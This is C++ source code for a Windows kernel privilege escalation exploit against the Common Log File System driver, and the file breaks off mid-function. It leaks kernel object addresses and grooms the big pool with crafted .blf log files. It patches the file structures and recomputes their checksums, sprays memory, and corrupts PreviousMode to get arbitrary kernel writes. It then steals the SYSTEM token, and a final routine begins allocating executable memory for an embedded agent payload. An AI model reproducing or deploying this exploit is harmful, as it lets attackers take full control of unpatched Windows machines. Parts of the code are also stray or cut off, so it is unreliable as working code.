//
//
#pragma warning (disable : 4005)
#pragma warning(disable:28159)

#include <stdio.h>
#include <iostream>
#include <windows.h>CClfsRequest::FlushDone
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "ntos.h"
#include "crc32.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")

BYTE g_Agent[0x2000] = { 'C' , 'A' , 'F' , 'E' , 'C' , 'A' , 'F' , 'E' };

/*
/*
Windows Server 2016 Standard ------>
Windows Server 2019 Standard ------> 17763 token offset: 0x358 decimal: 856
Windows Server 2022 Standard ------> 20348 token offset: 0x4b8 decimal: 1208
Windows 10 Pro Version 21H1 -------> 19041 19043 offset: 0x4b8 decimal: 1208
Windows 10 Pro Version 21H2 -------> 19041 offset: 0x4b8  decimal: 1208
Windows 11 Pro Version 21H2 -------> 22000 token offset: 0x4b8  decimal: 1208
*/


//
// NT syscalls
//
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10
int crcCalculatorAndFix(char*, int);

typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;


typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;


typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

_NtQuerySystemInformation fnNtQuerySystemInformation = NULL;
_NtWriteVirtualMemory fnNtWriteVirtualMemory = NULL;

//
// Leaked addresses
//
DWORD64 g_EProcessAddress = 0;
DWORD64 g_EThreadAddress = 0;
DWORD64 g_PreviousModeAddress;
DWORD64 g_TokenAddress, my_pidEprocess = 0;

//
// Version dependent offsets
//
#define OFFSET_OF_PREVIOUS_MODE 0x232
#define OFFSET_OF_WIN32PROCESS 0x3b0
#define OFFSET_OF_SEP_TOKEN_PRIVILEGES 0x40
#define OFFSET_OF_DCOMPOSITIONPROCESS 0x100


//
// CInteractionTrackerMarshaler object offsets
//
#define OFFSET_OF_FUNCTION 0x50
#define OBJECT_SIZE 0x1a0
typedef NTSTATUS func(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
// Global Variables 
IO_STATUS_BLOCK v30;
IO_STATUS_BLOCK v31;
UINT64 offset_SeSetAccess = 0;
UINT64 offset_RtlClearBit = 0;
UINT64 offset_FsRtlCurrentBatchOplock = 0;
func* _NtFsControlFile;
UINT64 fnSeSetAccessStateGenericMapping = 0;
UINT64 offset_ClfsEarlier = 0;
UINT64 fnClfsEarlierLsn = 0;
UINT64 fnRtlClearBit = 0;
UINT64 fnFsRtlCurrentBatchOplock = 0;
CHAR clfs_path[] = { "\\SystemRoot\\System32\\drivers\\CLFS.SYS" };
FARPROC v22b = NULL;
FARPROC v23b = NULL;
FARPROC v22a = NULL;
FARPROC v23a = NULL;
FARPROC v24a = NULL;
UINT64 ntos_kernelBase = NULL;
UINT64 clfs_kernelBase = NULL;
WCHAR* stored_env_xfname = { 0 };
UINT64 v14 = 0;
UINT64 v15 = 0;
WCHAR* stored_env_containerfname = { 0 };

DWORD* hReadPipe[2] = { 0 };
UINT64 System_token_value = 0;
size_t numread;
#define NUMELEM 0x7a00
#define NUMELEM2 0x400
char buff[0x7a00];
char buff2[0x400];
INT64 v22 = 0;
INT64 v23 = 0;
INT64 v26 = 0;
INT64 v24 = 0;
INT64 v31b = 0;
INT64 v32 = 0;
UINT num_of_CLFS = 0;
PUINT p_num_of_CLFS = &num_of_CLFS; // number of CLFS tags
CHAR tag[] = { "Clfs" };
PUINT64 v10 = 0; // Offset of last field virtual address
unsigned int v9 = 0; // stores the amount of bigpool clfs tags
WCHAR* stored_env_fname;
DWORD _pid = 0;
DWORD pid_to_find = 0;
int token_offset = 0;
LONGLONG token_value = 0;
int winversion = 0;
WCHAR* stored_env_open;
WCHAR* foldr = nullptr;
DWORDLONG system_EPROCESS = 0;
PUINT64 kernelAddrArray = 0;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
HANDLE hToken = NULL;
HMODULE user32 = NULL;
int flag = 0;
int flag2 = 0;
UINT64 dest2 = 0;
UINT64 dest3 = 0;
UINT64 value2 = 0;
UINT64* value3 = 0;
UINT64 next_token;
HMODULE ntbase = 0;



// Get OS version to get TOKEN offsets




SIZE_T GetObjectKernelAddress(HANDLE Object)
{
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	ULONG	handleInfoSize = 0x1000;
	ULONG	retLength;
	NTSTATUS status;
	SIZE_T kernelAddress = 0;
	BOOL bFind = FALSE;

	while (TRUE)
	{
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

		status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

		if (status == 0xC0000004 || NT_SUCCESS(status)) // STATUS_INFO_LENGTH_MISMATCH
		{
			LocalFree(handleInfo);

			handleInfoSize = retLength + 0x100;
			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

			status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);


			if (!handleInfo) {
				printf("[!] cannot read handle info %x\n", (unsigned int)GetLastError());
				exit(1);
			}

			ULONG numHandles = (ULONG)handleInfo->NumberOfHandles;

			if (!numHandles) {
				printf("[!] cannot read number of handles %x\n", (unsigned int)GetLastError());
				exit(1);
			}

			if (NT_SUCCESS(status))
			{
				for (ULONG i = 0; i < numHandles; i++)
				{
					if ((DWORD64)Object == 0x4)
					{
						if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{

							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
					else
					{
						if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{
							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
				}
			}

		}

		if (handleInfo)
			LocalFree(handleInfo);

		if (bFind)
			break;
	}

	return kernelAddress;
}

VOID InitEnvironment()
{

	//
	// Resolve NT syscalls
	//

	ntbase = LoadLibraryA("ntdll.dll");

	if (!ntbase) {
		printf("[!] LoadLibrary failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntbase, "NtQuerySystemInformation");

	DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &hProcess, 0, FALSE, DUPLICATE_SAME_ACCESS);
	//	printf("[+] HPROCESS %p\n", hProcess);
	g_EProcessAddress = GetObjectKernelAddress(hProcess);
	printf("[+] MY EPROCESSS %p\n", (void*)g_EProcessAddress);

	system_EPROCESS = GetObjectKernelAddress((HANDLE)4);
	printf("[+] SYSTEM EPROCESSS %p\n", (void*)system_EPROCESS);

	DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
	g_EThreadAddress = GetObjectKernelAddress(hThread);
	printf("[+]_ETHREAD ADDRESS %p\n", (void*)g_EThreadAddress);

	g_PreviousModeAddress = g_EThreadAddress + OFFSET_OF_PREVIOUS_MODE;
	printf("[+]PREVIOUS MODE ADDRESS %p\n", (void*)g_PreviousModeAddress);


	return;
}




int createInitialLogFile() {

	WCHAR* foldr = nullptr;
	size_t sz = 0;
	if (_wdupenv_s(&foldr, &sz, L"PUBLIC") == 0 && foldr != nullptr)
	{
		printf("[+] Variable = %ls\n", foldr);

	}

	WCHAR* tmp_env = (WCHAR*)malloc(0x1000);

	if (!tmp_env) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	WCHAR* stored_env = tmp_env; // where Public environment variable is stored
	memset(tmp_env, 0, 0x1000);  // 

	wsprintfW(stored_env, L"%s", foldr);  // C:\Users\Public


	WCHAR* tmp_env2 = (WCHAR*)malloc(0x1000);

	if (!tmp_env2) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	WCHAR* stored_env_log = tmp_env2; // where Public environment variable is stored
	memset(tmp_env2, 0, 0x1000);

	wsprintfW(stored_env_log, L"LOG:%s", stored_env);

	srand((unsigned int)time(NULL));
	int v59 = rand();

	WCHAR* tmp_env3 = (WCHAR*)malloc(0x1000);

	if (!tmp_env3) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_fname = tmp_env3; // where Public environment variable is stored
	memset(tmp_env3, 0, 0x1000);

	wsprintfW(stored_env_fname, L"%s\\%d", stored_env_log, v59);


	WCHAR* tmp_env4 = (WCHAR*)malloc(0x1000);

	if (!tmp_env4) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_open = tmp_env4; // where Public environment variable is stored
	memset(tmp_env4, 0, 0x1000);




	wsprintfW(stored_env_open, L"%s\\%d.blf", stored_env, v59);  // C:\Users\Public\MyLog.blf


	WCHAR* tmp_env5 = (WCHAR*)malloc(0x1000);

	if (!tmp_env5) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_xfname = tmp_env5; // where Public environment variable is stored
	memset(tmp_env5, 0, 0x1000);

	wsprintfW(stored_env_xfname, L"%s\\Lxg", stored_env_log);



	WCHAR* tmp_env6 = (WCHAR*)malloc(0x1000);

	if (!tmp_env6) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_containerfname = tmp_env6; // where Public environment variable is stored
	memset(tmp_env6, 0, 0x1000);


	srand((unsigned int)time(NULL));
	int v56 = rand();

	printf("random part name of the container %d\n", v56);

	wsprintfW(stored_env_containerfname, L"%s\\.%d", stored_env, v56);



	// 1. Create a base log file MyLog.blf in the folder C:\Users\Public\ via the CreateLogFile API

	HANDLE logFile = CreateLogFile(stored_env_fname, GENERIC_READ | GENERIC_WRITE, 1, 0, 4, 0);

	if (logFile == (HANDLE)-1) {
		DWORD error = GetLastError();
		printf("Could not create log file, error: 0x%x\n", (unsigned int)error);
		exit(-1);
	}
	printf("[+] Log file created with handle --> 0x%p\n", (void*)logFile);
	CloseHandle(logFile);
	//getchar();
	return 0;
}





// SystemBigPoolInformation

int getBigPoolInfo(PUINT64 _a2)
{
	UINT64 v7 = 0;
	UINT v8 = 0; // counter
	UINT64 v11 = 0;
	ULONG retlen = 0;
	PUINT64 v15 = 0;
	ULONG v4 = 0;
	DWORD* v5;
	UINT v6 = 0;

	DWORD* v3 = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);

	if (!v3) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	if (fnNtQuerySystemInformation(SystemBigPoolInformation, v3, 0x1000, &retlen) == 0xC0000004)
	{
		while (1)
		{
			VirtualFree(v3, 0, 0x8000);
			v4 = retlen;
			v5 = (DWORD*)VirtualAlloc(0, (SIZE_T)retlen, 0x1000, 4);
			v3 = v5;
			if (!v5)
			{
				printf("[+] Error Allocating Memory\n");
				break;
			}

			if (fnNtQuerySystemInformation(SystemBigPoolInformation, v5, v4, &retlen) != 0xC0000004)
			{
				goto label_4;
			}
			else {
				break;
			}

		}

	}
	else {
	label_4:

		v6 = (UINT) * (PUINT)v3; // v6 is the field count on the SYSTEM_BIGPOOL_INFORMATION


		if (flag2 == 0) {
			kernelAddrArray = (PUINT64)malloc((UINT64)v6 * 8);
			if (!kernelAddrArray) {
				printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
				exit(1);
			}
			printf("Kernel addresss array %p", kernelAddrArray);
			memset(kernelAddrArray, 0, ((UINT64)v6 * 8));
			flag2++;
		}

		if (v6)
		{
			v9 = *p_num_of_CLFS;
			v10 = (PUINT64)&v3[4 * v6 - 4 + 2 * v6];


			do {
				v11 = *v10 & 0xFFFFFFFFFFFFFFFE;

				if ((*v10 & 1) == 0)
				{
					v11 = *v10;
				}
				if (v10[1] == 0x7a00)  // search for the clfs base log file size
				{
					UINT v12 = 0;
					while (1)
					{
						CHAR v13 = tag[v12++];
						if (v13 != *((BYTE*)v10 + v12 + 15))
						{
							break;
						}

						if (v12 == 5) // tag Clfs found !
						{
							UINT v14 = 0;

							if (v9 <= 0)
							{
							label_16:
								UINT v16 = v9++;
								kernelAddrArray[v16] = v11;


								if (_a2)
								{
									++v8;
									*_a2 = v11;
								}
							}
							else
							{
								v15 = kernelAddrArray;
								while (*v15 != v11)
								{
									++v14;
									++v15;
									if (v14 >= v9) {
										goto label_16;
									}
								}
							}
							break;
						}

					}
				}


				++v7;
				v10 -= 3; // back 0x18 to previous System Big Pool Entry to find the 0x7a00
			} while (v7 < v6); // it compares the counter against the field count of SYSTEM_BIGPOOL_INFORMATION

			*p_num_of_CLFS = v9;
		}

		if (_a2 && v8 == 0) {
			printf("[+] Not found available chunk\n");
			exit(1);
		}
		VirtualFree(v3, 0, 0x8000);
	}
	return 0;
}


VOID GetOffsetBetweenPools() {
	v26 = 0;
	v24 = 0;
	v22 = 0;
	v23 = 0;
	int final = 0;

	final = 5;

	UINT64 a2 = 0;
	PUINT64 p_a2 = &a2;

	WCHAR* buf = (WCHAR*)malloc(0x1000);

	if (!buf) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	do
	{
		while (1)
		{
			while (1)
			{
				do
				{
					HANDLE logFile1;
					do
					{
						v26 = v24;
						memset(buf, 0, 0x1000);
						unsigned int rnum = rand();
						wsprintfW((LPWSTR)buf, L"%s_%d", stored_env_fname, rnum);
						logFile1 = CreateLogFile((LPWSTR)buf, 0xc0010000, 3, 0, 4, 0);
					} while (logFile1 == (HANDLE)-1);

					HANDLE* handleArray = (HANDLE*)malloc(4);
					if (handleArray == 0) { exit(1); }
					*handleArray = logFile1;
					getBigPoolInfo(p_a2); // SystemBigPoolInformation


					v24 = p_a2[0];


				} while (!v26);

				v31b = p_a2[0] - v26;
				v32 = v26 - p_a2[0];

				if (v31b > 0) {
					v32 = v31b;
				}
				printf("[+] Distancia --> %p\n", (void*)v32);
				if (v23) break;
				v23 = v32;
			}

			if (v23 == v32) break;
			v22 = 0;
			v23 = v32;
		}
		printf("[+] Numero de consecutivos --> %p\n", (void*)v22);
		++v22;
	} while (v22 < final);
	printf("Finalized\n");
	//getchar();
	return;
}


VOID craftFile() {
	FILE* pfile;

	unsigned char checkSum[] = { 0x00, 0x00, 0x00, 0x00 }; // {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c
	unsigned char signaturOffset[] = { 0x50, 0x00, 0x00, 0x00 }; // offset 0x868 SignaturesOffset
	unsigned char ccoffsetArray[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x9a8 rgClients
	if (flag == 2) {
		unsigned char cbsymbolZone[] = { 0x4b, 0x81, 0x00, 0x00 }; // offset 0x1b98 for windows 2016
	}
	//unsigned char cbsymbolZone[] = { 0x4b, 0x11, 0x01, 0x00 }; // offset 0x1b98 for windows 11 and 10
	unsigned char blockNameoffset[] = { 0xb8, 0x1b, 0x00, 0x00 }; // offset 0x2390 cbSymName
	unsigned char blockAtributeoffset[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x2394 cboffset
	unsigned char fakeClientcontext[] = { 0x07, 0xf0, 0xfd, 0xc1, 0x88 }; // offset 0x23a0
	unsigned char fakeClientcontext2[] = { 0x01, 0x00, 0x00, 0x00 }; // offset 0x23ab
	unsigned char fakeClientcontext3[] = { 0x20, 0x00, 0x00, 0x00 }; // offset 0x2418

	unsigned char RecordOffset[] = { 0x98, 0x03, 0x00, 0x00 }; // offset 0x28
	unsigned char TotalSectorCount[] = { 0x02, 0x00, 0x02, 0x00 }; // offset 0x28

	wprintf((LPWSTR)L"Opening file %s\n", stored_env_open);

	_wfopen_s(&pfile, stored_env_open, L"r+");
	if (pfile == 0) {
		printf("Cant't open file, error %x\n", GetLastError());
		exit(1);
	}
	printf("[+] file successfully opened\n");


	//fseek(pfile, 0xc, SEEK_SET);
	//fwrite(checkSum, sizeof(char), sizeof(checkSum), pfile);

	fseek(pfile, 0x68, SEEK_SET);
	fwrite(signaturOffset, sizeof(char), sizeof(signaturOffset), pfile);

	fseek(pfile, 0x4, SEEK_SET);
	fwrite(TotalSectorCount, sizeof(char), sizeof(TotalSectorCount), pfile);

	//////
	//fseek(pfile, 0x28, SEEK_SET);
	//fwrite(RecordOffset, sizeof(char), sizeof(RecordOffset), pfile);
	/////

	//fseek(pfile, 0x2390, SEEK_SET);
	//fwrite(blockNameoffset, sizeof(char), sizeof(blockNameoffset), pfile);

	//fseek(pfile, 0x2394, SEEK_SET);
	//fwrite(blockAtributeoffset, sizeof(char), sizeof(blockAtributeoffset), pfile);

	//fseek(pfile, 0x23a0, SEEK_SET);
	//fwrite(fakeClientcontext, sizeof(char), sizeof(fakeClientcontext), pfile);

	//fseek(pfile, 0x23ab, SEEK_SET);
	//fwrite(fakeClientcontext2, sizeof(char), sizeof(fakeClientcontext2), pfile);

	//fseek(pfile, 0x2418, SEEK_SET);
	//fwrite(fakeClientcontext3, sizeof(char), sizeof(fakeClientcontext3), pfile);

	fclose(pfile);


	printf("[+] Archivo modificado !\n");

	return;
}

int openFile() {
	getchar();
	FILE* fd = NULL;
	memset(buff2, 0, sizeof(buff2));
	memset(buff, 0, sizeof(buff));

	_wfopen_s(&fd, stored_env_open, L"rb");

	if (fd == 0) { exit(1); }


	fseek(fd, 0x0, SEEK_SET);
	numread = fread(buff2, (size_t)1, (size_t)NUMELEM2, fd);
	*((DWORD*)(buff2 + 0xc)) = 0;

	if (numread != NUMELEM2)
	{
		//       printf("\n fread() failed\n");
		return 1;
	}

	uint32_t CRC = crcCalculatorAndFix(buff2, NUMELEM2);

	printf("Piece-wise crc32 of struct Data is: 0x%X \n", CRC);

	fseek(fd, 0x800, SEEK_SET);
	numread = fread(buff, (size_t)1, (size_t)NUMELEM, fd);
	*((DWORD*)(buff + 0xc)) = 0;

	if (numread != NUMELEM)
	{
		//       printf("\n fread() failed\n");
		return 1;
	}

	uint32_t CRC2 = crcCalculatorAndFix(buff, NUMELEM);

	printf("Piece-wise crc32 of struct Data is: 0x%X \n", CRC2);

	fclose(fd);

	_wfopen_s(&fd, stored_env_open, L"r+");

	if (fd == 0) { exit(1); }

	getchar();
	fseek(fd, 0xc, SEEK_SET);
	fwrite(&CRC, 1, 4, fd);
	fseek(fd, 0x80c, SEEK_SET);
	fwrite(&CRC2, 1, 4, fd);

	fclose(fd);
	return 1;
}

int crcCalculatorAndFix(char* mybuf, int mysize) {


	uint32_t table[256];
	crc32::generate_table(table);

	// Struct, for piece-by-piece, bytewise
	struct DataStruct {
		uint16_t data1;
		uint16_t data2;
		float mypi;
		uint32_t myclock;
		bool begun;
	};



	char* ptr = (char*)mybuf;
	uint16_t slen = mysize;
	printf("Size of Data struct is: %x\n", slen);                 // 16 bytes

	uint32_t CRC = 0;
	for (int cnt = 0; cnt < slen; cnt++) {
		CRC = crc32::update(table, CRC, ptr, 1);
		ptr++;
	}




	return CRC;
}

int doHeapSpray() {

	UINT64 alloc00 = 0x5000000;
	UINT64 alloc01 = 0x10000;


	if (!VirtualAlloc((LPVOID)alloc00, 0x100000, 0x3000, 4)) {
		printf("[-] Failed to allocate memory\n");
		return 0;
	}
	if (!VirtualAlloc((LPVOID)0x10000, 0x1000000, 0x3000, 4)) {
		DWORD lastError = GetLastError();
		printf("[-] Failed to allocate memory at address 0x1000\n");
		return 0;
	}
	for (UINT64 i = 0; i < 0x1000000; i += 0x10)
		*(UINT64*)(i + 0x10000) = 0x5000000;


	printf("[+] Successful allocated at 0x10000\n");
	//	getchar();
	return 0;
}

VOID FindKernelModulesBase()
{

	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return;
	}

	NTSTATUS status = fnNtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return;
		}

		memset(lpHeapBuffer, 0, dwBytesReturned);

		status = fnNtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->NumberOfModules > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		ntos_kernelBase = retval;

	}

	unsigned int i = 0;
	for (i = 0; i < psm->NumberOfModules; i++)
	{
		if (!strncmp(clfs_path, (CHAR*)psm->Modules[i].FullPathName, strlen(clfs_path)))  break;
	}
	printf("[+] Module name --> %s\n", psm->Modules[i].FullPathName);

	clfs_kernelBase = (UINT64)psm->Modules[i].ImageBase;
	return;
}


int pipeArbitraryWriteValues() {

	VOID* v9a = 0;
	//	UINT64 v10 = 0;
	ULONG retlen2 = 0;
	DWORD* v10 = 0;
	v10 = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);


	HMODULE nt = GetModuleHandleA("ntdll");

	printf("Please Attach me\n");


	dest2 = 0xffffffff;
	dest3 = 0x100000007;
	value2 = 0x000F000000000000;
	value3 = 0;
	value3 = &value2;

	if (VirtualAlloc((LPVOID)dest2, 0x100000, 0x3000, 4))
	{
		memset((LPVOID)dest3, 0, 0xff8);
		*(UINT64*)dest2 = v15;


		*(UINT64*)dest3 = value2;

		for (UINT64 j = 8; j < 0x1000000; j += 0x10)
		{
			*(UINT64*)(j + 0x10000) = g_PreviousModeAddress;
		}


		HMODULE CLFS_userBase = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
		if (CLFS_userBase)
		{
			v22b = GetProcAddress(CLFS_userBase, "ClfsEarlierLsn");

		}


		HMODULE ntos_userBase = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
		if (ntos_userBase)
		{
			v23a = GetProcAddress(ntos_userBase, "RtlClearBit");
			v24a = GetProcAddress(ntos_userBase, "FsRtlCurrentBatchOplock");
		}


		FindKernelModulesBase();


		printf("[+] NTOSKRNL base on user  -------------------------> %p\n", (void*)ntos_userBase);
		printf("[+] NTOSKRNL base on Kernel ------------------------> %p\n", (void*)ntos_kernelBase);


		offset_SeSetAccess = (UINT64)v22a - (UINT64)ntos_userBase;
		offset_RtlClearBit = (UINT64)v23a - (UINT64)ntos_userBase;
		offset_FsRtlCurrentBatchOplock = (UINT64)v24a - (UINT64)ntos_userBase;


		fnRtlClearBit = ntos_kernelBase + offset_RtlClearBit;
		fnFsRtlCurrentBatchOplock = ntos_kernelBase + offset_FsRtlCurrentBatchOplock;



		printf("[+] CLFS.SYS base on user  -------------------------> %p\n", (void*)CLFS_userBase);
		printf("[+] CLFS base on Kernel  ---------------------------> %p\n", (void*)clfs_kernelBase);
		printf("[+] ClfsEarlierLsn user address --------------------> %p\n", (void*)v22b);

		offset_ClfsEarlier = (UINT64)v22b - (UINT64)CLFS_userBase;

		printf("[+] Offset ClfsEarlierLsn --------------------------> %p\n", (void*)offset_ClfsEarlier);

		fnClfsEarlierLsn = clfs_kernelBase + offset_ClfsEarlier;


		printf("[+] ClfsEarlierLsn kernel address ------------------> %p\n", (void*)fnClfsEarlierLsn);

		printf("[+] RtlClearBit kernel address ------------------> %p\n", (void*)fnRtlClearBit);

		printf("[+] ExFreeCacheAwareRundownProtection kernel address ------------------> %p\n", (void*)fnFsRtlCurrentBatchOplock);




		return 0;

	}

	return 0;

}

int pipeArbitraryWrite() {
	HANDLE v51 = 0;


	*(PUINT64)(0x5000018) = fnFsRtlCurrentBatchOplock;
	*(PUINT64)(0x5000000) = 0x0;
	*(PUINT64)(0x5000008) = fnRtlClearBit;
	printf("verificar\n");
	//getchar();



	//   printf("attach\n");
	v51 = CreateLogFile(stored_env_fname, 0xC0010000, 3u, 0i64, 4, 0); // 0xc0010000 #gets a handle of MyLog.blf
	printf("OK 0x%p\n", (void*)v51);
	srand((unsigned int)time(NULL));
	int v53 = rand();
	WCHAR* v25 = (WCHAR*)malloc(0x1000);
	WCHAR* v85 = v25;
	if (v85 == 0) {
		printf("Allocating fail\n");
		exit(1);
	}

	memset(v25, 0, 0x1000);
	wsprintfW(v85, L"%s_%d", stored_env_xfname, v53);



	///* 4. Call the CreateLogFile API to create a base log file MyLxg_xxx.blf in the folder C:\Users\Public\. */
	//HANDLE v55 = CreateLogFile(v85, GENERIC_READ | GENERIC_WRITE | DELETE, 3u, 0i64, 4u, 0); //gets a handle of MyLogxxx.blf
	//printf("OK handle 55 0x%p\n", (void*)v55);
	//if (v55 == (HANDLE)-1i64) {
	//	printf("Choose name fail ---> Duplicate\n");
	//	exit(1);
	//}

	/* 5. Call the AddLogContainer API to add a log container for the base log file MyLxg_xxx.blf created in Step 4.*/

	LONGLONG pcbContainer = 512;
	//  int v56 = rand();
	WCHAR pwszContainerPath[768] = { 0 };


	wsprintfW(pwszContainerPath, stored_env_containerfname);

	printf("string copiada2: %ls\n", stored_env_containerfname);

	printf("pwszContainerPath: %ls\n", pwszContainerPath);



	//if (!AddLogContainer(v55, (PULONGLONG)&pcbContainer, pwszContainerPath, 0i64)) {
	//	CloseHandle(v55);
	//	CloseHandle(v51);
	//	printf("AddLogContainer Fail, please delete C:\\Users\\Public\\MyLxg_xxx.blf and try again\n");
	//	exit(1);
	//}

	//printf("LOG:C:\\Users\\Public\\Mylxg_xxx AddLogContainer OK\n");
	/* 7. Call the AddLogContainer API to add a log container for the base log file MyLog.blf opened in Step 3. */

	pcbContainer = 512;
	srand((unsigned int)time(NULL));

	wsprintfW(pwszContainerPath, stored_env_containerfname);



	AddLogContainer(v51, (PULONGLONG)&pcbContainer, pwszContainerPath, 0i64); // Crash !

	//printf("LOG:C:\\Users\\Public\\MyLog AddLogContainer OK2\n");

	char v33[16] = { 0 };
	char v28[4] = {};
	v28[0] = 1;


	/* 8. Call NtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1, (FILE_INFORMATION_CLASS)13),
where the last parameter is the type of FileInformationClass. When the value is FileDispositionInformation (13),
the function will delete the file when it is closed or will cancel a previously requested deletion. */

	typedef NTSTATUS func(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);


	if (ntbase == 0) { printf("The nt base cannot be readed exit ...\n"); exit(1); }

	func* _NtSetInformationFile = (func*)GetProcAddress(ntbase, "NtSetInformationFile");

	printf("NtSetInformationFile address --> 0x%p\n", (void*)_NtSetInformationFile);
	printf("Calling NtSetInformationFile\n");

	typedef NTSTATUS func2(HANDLE, PVOID, PVOID, ULONG, PULONG);



	func2* _NtReadVirtualMemory = (func2*)GetProcAddress(ntbase, "NtReadVirtualMemory");

	func2* _NtWriteVirtualMemory = (func2*)GetProcAddress(ntbase, "NtWriteVirtualMemory");

	typedef NTSTATUS func(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

	//NTSTATUS setresult = _NtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1i64, (FILE_INFORMATION_CLASS)13);
	printf("SetInformationFile: 0x%x\n", (unsigned int)GetLastError());

	HANDLE CurrentProcess = GetCurrentProcess();

	ULONG64 Token_system;
	BYTE Prev = 1;


	/* 9. Call the CloseHandle API to close the handle of the base log file MyLxg_xxx.blf, to trigger this vulnerability. */

	/*CloseHandle(v55);*/
	CloseHandle(v51);

	NTSTATUS setresult = _NtReadVirtualMemory(CurrentProcess, (PVOID)(system_EPROCESS + token_offset), &Token_system, 8, 0);

	if (setresult != 0) { printf("The exploit failed reading the System token ...\n"); exit(1); }

	printf("token system %p\n", (void*)Token_system);

	//typedef NTSTATUS func2(HANDLE, PVOID, PVOID, ULONG, PULONG);

	setresult = _NtWriteVirtualMemory(CurrentProcess, (PVOID)(g_EProcessAddress + token_offset), (PVOID)&Token_system, 8, 0);

	if (setresult != 0) { printf("The exploit failed replacing the Token of my process...\n"); exit(1); }
	//restoring previous mode to 1

	setresult = _NtWriteVirtualMemory(CurrentProcess, (PVOID)g_PreviousModeAddress, (PVOID)&Prev, 1, 0);

	if (setresult != 0) { printf("The exploit failed when restoring Previuos mode...\n"); exit(1); }

	return 0;

}







VOID RunPayload()
{
	PVOID Payload = NULL;

	Payload = VirtualAlloc(NULL, sizeof(g_Agent), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Payload)
	{
		RtlZeroMemory(Payload, sizeof(g_Agent));
